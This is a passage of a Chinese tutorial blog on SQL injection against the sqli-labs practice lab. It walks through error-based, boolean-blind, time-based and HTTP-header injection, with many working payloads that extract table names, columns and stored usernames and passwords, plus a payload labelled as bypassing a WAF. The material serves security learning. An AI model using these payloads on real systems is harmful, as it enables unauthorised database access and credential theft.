class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(id,<span class="string">&#x27;:&#x27;</span>,username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_10.png" alt=""></p><p>至此，联合查询整个过程结束。注入的时候找到注入点后只需套入语句即可。</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>   报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。<br>    报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p><p>​    推荐三种报错注入的方法，直接套用就行。以less-1为例子</p><ul><li>group by 重复键冲</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> 查询的内容 <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>提交如下，获取数据库名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_11.png" alt=""></p><ul><li>extractvalue() 函数</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;)) --+</span></span><br></pre></td></tr></table></figure><p>提交<code>?id=1&#39; and extractvalue(1,concat(&#39;^&#39;,(select database()),&#39;^&#39;)) --+</code>获取数据库名字</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_12.png" alt=""></p><ul><li>updatexml() 函数</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;^&#x27;</span>,(需要查询的内容),<span class="string">&#x27;^&#x27;</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><strong>提交如下，获取数据库名字</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_13.png" alt=""></p><p><strong>获取当前数据库中表的名字</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; ),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_14.png" alt=""></p><p>这里是说要显示的内容超过一行它不能显示那么多，所以在<code>table_schema=&#39;security&#39;</code>后加上 <code>limit 0,1</code>，显示第一行（显示第0行的往下一行，不包括第0行）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_15.png" alt=""></p><p>如果要看第二行则，<code>limit1,1</code>（第一行的往下一行，不包括第一行，即显示第二行），看第三行则<code>limit2,1</code>，以这个方法获取第四个表为<code>users</code></p><p><strong>爆表中的字段</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1 ),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_16.png" alt=""></p><p>总共爆出的字段为： <code>id , username , password</code></p><p><strong>爆字段中的内容</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select group_concat(username,&quot;--&quot;,password) from users limit 0,1 ),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br></pre></td></tr></table></figure><p>三组用户名和密码</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_17.png" alt=""></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p> 布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例</p><p><strong>我们输入正确的id，显示You are in …..</strong></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_18.png" alt=""></p><p>我们输入错误的语句如<code>id=1&#39;</code> ，或者<code>id=-1</code>时，就什么都不显示。这就是布尔盲注，屏幕上能得到信息不多，就是两种状态</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_19.png" alt=""></p><p>源码如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1 &quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"> </span><br><span class="line">if($<span class="type">row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">    ｝</span><br></pre></td></tr></table></figure><p>所以，我们构造判断语句，根据页面是否回显证实猜想。一般用到的函数<code>ascii() 、substr() 、length()，exists()、concat()</code>等。</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_20.png" alt=""></p><p><strong>判断数据库类型</strong></p><ul><li>MySQL数据库表   information_schema.tables</li><li>access           msysobjects </li><li>SQLServer        sysobjects</li></ul><p>用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Mysql数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from information_schema.tables) --+</span></span><br><span class="line"><span class="string">//判断是否是 access数据库</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> msysobjects) <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Sqlserver数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from sysobjects) --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_21.png" alt=""></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_22.png" alt=""></p><p>所以当前数据库为mysql数据库</p><p><strong>判断当前数据库名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>：判断当前数据库的长度，利用二分法</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())&gt;5 --+  //正常显示</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;</span><span class="number">10</span> <span class="comment">--+  //不显示任何数据</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())&gt;7 --+  //正常显示</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;</span><span class="number">8</span> <span class="comment">--+  //不显示任何数据</span></span><br><span class="line"> </span><br><span class="line">大于<span class="number">7</span>正常显示，大于<span class="number">8</span>不显示，说明大于<span class="number">7</span>而不大于<span class="number">8</span>，所以可知当前数据库长度为<span class="number">8</span>个字符</span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断数据库的第一个字符</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))&gt;115 --+ //100为ascii表中的十进制，对应字母s</span></span><br><span class="line"><span class="string">//判断数据库的第二个字符</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断数据库的第三个字符</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),3,1))&gt;100 --+</span></span><br><span class="line"><span class="string">...........</span></span><br><span class="line"><span class="string">由此可以判断出当前数据库为 security</span></span><br></pre></td></tr></table></figure><p><strong>判断当前库的表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>猜测当前数据库中是否存在admin表</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from admin) --+</span></span><br><span class="line"><span class="string">1：判断当前数据库中表的个数</span></span><br><span class="line"><span class="string">// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">&gt;</span><span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>：判断每个表的长度</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为<span class="number">6</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+</span></span><br><span class="line"><span class="string">//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">6</span> <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line"><span class="number">3</span>：判断每个表的每个字符的ascii值</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断第一个表的第一个字符的ascii值</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span></span><br><span class="line"><span class="string">//判断第一个表的第二个字符的ascii值               </span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">--+</span></span><br><span class="line">.........</span><br><span class="line">由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</span><br></pre></td></tr></table></figure><p><strong>判断表的字段</strong></p><ul><li>判断字段个数</li><li>判断每个字段的长度</li><li>猜每个字段的字符</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>如果已经证实了存在admin表，那么猜测是否存在username字段</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select username from admin) </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">1：判断表中字段的个数</span></span><br><span class="line"><span class="string">//判断users表中字段个数是否大于5</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>)<span class="operator">&gt;</span><span class="number">5</span> <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>：判断每个字段的长度</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断第一个字段的长度</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1))&gt;5 --+</span></span><br><span class="line"><span class="string">//判断第二个字段的长度   </span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span> <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line"><span class="number">3</span>：判断每个字段名字的ascii值</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断第一个字段的第一个字符的ascii</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1,1))&gt;100 --+</span></span><br><span class="line"><span class="string">//判断第一个字段的第二个字符的ascii</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">--+</span></span><br><span class="line">...........</span><br><span class="line"> </span><br><span class="line">由此可判断出users表中存在 id、username、password 字段</span><br></pre></td></tr></table></figure><p><strong>爆字段中的数据</strong></p><ul><li>猜字段中数据的长度</li><li>猜字段数据的每个字符ascii码 得字符</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据</span><br><span class="line"> </span><br><span class="line"><span class="number">1</span>: 判断数据的长度</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 判断id字段的第一个数据的长度</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select id from users limit 0,1))&gt;5 --+</span></span><br><span class="line"><span class="string">// 判断id字段的第二个数据的长度</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">5</span> <span class="comment">--+</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>：判断数据的ascii值</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 判断id字段的第一行数据的第一个字符的ascii值</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select id from users limit  0,1),1,1))&gt;100 --+</span></span><br><span class="line"><span class="string">// 判断id字段的第二行数据的第二个字符的ascii值</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> id <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> <span class="comment">--+</span></span><br><span class="line">...........</span><br></pre></td></tr></table></figure><p>一般布尔盲注，手工去注入过于繁琐，不建议手工注入，可以借助于工具。</p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p> 也叫延时注入。通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用“绝招”—延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。我们以第9关为例，在id=1后面加单引号或者双引号，页面不会发生任何改变，所以我们考虑绝招延时注入。<br><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_23.png" alt=""></p><p><strong>延时注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and sleep(5) --+    </span></span><br></pre></td></tr></table></figure><p>如图所示，观察请求的时间线，大概在5秒以上，说明构造的<code>sleep(5)</code> 语句起作用，可以把这个时间线作为sql 注入的判断依据。</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_24.png" alt=""></p><p><strong>获取数据库名字</strong></p><p>延时注入与布尔盲注类似，构造方法如下，提交参数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),1,1))= 115,sleep(5),0) --+</span></span><br></pre></td></tr></table></figure><blockquote><p><code>if(expr1,expr2,expr3)</code>如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值</p></blockquote><p>代码的含义就是如果数据库名字的第一个字符的acsii值为115，则进行延时，否则返回0即什么都不返回</p><p>页面显示延时5 秒，说明数据库名字第一个字母的ASCII 值是115，也就是字母s</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_25.png" alt=""></p><p><strong>数据库名字第二个字母的判断</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+</span></span><br></pre></td></tr></table></figure><p>与盲注类似，后面就是猜数，这就是延时注入</p><p>==可以绕waf的payload==</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="operator">+</span>sleep(<span class="number">4</span>))a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="operator">+</span><span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h2><p>常见的sql注入一般是通过请求参数或者表单进行注入，而HTTP头部注入是通过HTTP协议头部字段值进行注入。http头注入常存在于以下地方</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_26.png" alt=""></p><p><strong>产生注入的条件</strong>：</p><ul><li>能够对请求头消息进行修改</li><li>修改的请求头信息能够带入数据库进行查询</li><li>数据库没有对输入的请求信息做过滤</li></ul><p><strong>User-Agent注入</strong></p><p>​        User-Agent：使得服务器能够识别客户使用的操作系统，浏览器版本等。（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等然后将其存入数据库中）。这里获取User-Agent就可以知道客户都是通过什么浏览器访问系统的，然后将其值保存到数据库中。</p><p>以sqli-labs less-18关为例，登录用户密码：dumb/0</p><p>1.判断注入点：user-agent值后面加上<code>&#39;</code>，引发报错，确定存在sql注入</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_27.png" alt=""></p><p>2.采用报错注入函数获取当前数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) and &#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_28.png" alt=""></p><p><strong>cookie注入</strong></p><p> cookie：服务器端用来记录客户端的状态。由服务端产生，保存在浏览器中,以sqli-labs less-20关为例，登录后</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_29.png" alt=""></p><p>\1. 首先判断注入点，加 ‘ 单引号报错</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_30.png" alt=""></p><p>\2. 采用报错注入函数获取当前数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) and &#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_31.png" alt=""><strong>Referer注入</strong></p><p> <strong>Referer：</strong>是HTTP header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理</p><p>以19关为例</p><p>1. 判断输入点，加单引号引发报错</p><p>2. 使用报错注入函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘ <span class="keyword">and</span> updatexml(<span 